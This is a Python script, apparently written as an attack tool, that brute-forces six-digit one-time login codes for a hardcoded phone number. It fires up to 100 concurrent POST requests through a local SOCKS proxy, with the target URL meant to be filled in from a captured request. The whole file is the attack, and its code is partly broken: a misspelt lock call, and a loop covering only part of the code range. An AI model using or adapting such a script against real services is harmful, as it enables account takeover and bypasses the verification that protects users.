__author__ = 'kyle_xiao'
# brute-force attack
import pycurl
import StringIO
import json
import threading

isSuccess = False
#thread_num: mumber of threads will be created for sending request
thread_num = 100
#current_num: number of the current active threads
current_num = 0
mutex = threading.Lock()
answer = 0

# # create a thread to request for the dynamic code.
class RequestThread(threading.Thread):

    def __init__(self,phoneNo,dynamicCode):
        threading.Thread.__init__(self)
        self.phoneNo = phoneNo
        self.dynamicCode = dynamicCode

    def run(self):
        buff = StringIO.StringIO()
        #target host and post files
        postInfo = "phoneNumber="+self.phoneNo+"&password=98d824d214e55224e4c5d931ad8642c2&dynamicCode="+self.dynamicCode
        url = ""    ## get the url by catching the request packet
        c = pycurl.Curl()
        #-------check proxy ip------
        #url2 = "ifconfig.me"
        #c.setopt(c.URL,url2)
        #-------setting the request by URL
        c.setopt(c.URL, url)
        c.setopt(c.WRITEFUNCTION,buff.write)
        c.setopt(c.POSTFIELDS,postInfo)
        c.setopt(pycurl.PROXYTYPE, 5)
        c.setopt(c.PROXY, "127.0.0.1:1080")
        c.perform()
        result = json.loads(str(buff.getvalue()))
        buff.close()

        if result["success"]=="success":
            global answer
            answer = self.dynamicCode
            mutex.aquire()
            try:
                global answer
                answer = self.dynamicCode
                global isSuccess
                isSuccess = True
            finally:
                mutex.release()
        else:
            print(result["success"])


for i in range(0,100000):
    while threading.active_count() > thread_num:
        pass

    t = RequestThread(str(13702335732),str(i).zfill(6))
    t.start()
    if isSuccess == True:
        print("success! and dynamicCode is "+answer)
